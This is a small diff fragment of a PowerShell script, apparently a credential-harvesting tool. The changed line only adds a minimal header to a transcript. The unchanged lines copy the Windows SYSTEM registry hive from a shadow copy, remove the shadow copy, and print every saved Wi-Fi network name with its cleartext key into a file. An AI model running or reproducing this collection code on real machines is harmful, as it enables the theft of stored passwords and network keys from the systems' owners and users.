@@ -53,7 +53,7 @@ Copy-Item 'C:\shadowcopy\Windows\System32\config\SYSTEM' $fileSaveDir
 Remove-Item -recurse -force 'C:\shadowcopy'
 
 
-Start-Transcript -Path $userDir"\wifi.txt"
+Start-Transcript -UseMinimalHeader -Path $userDir"\wifi.txt"
 dir *.xml |% {
 $xml=[xml] (get-content $_)
 Write-Host $xml.WLANProfile.SSIDConfig.SSID.name `t $xml.WLANProfile.MSM.Security.sharedKey.keymaterial
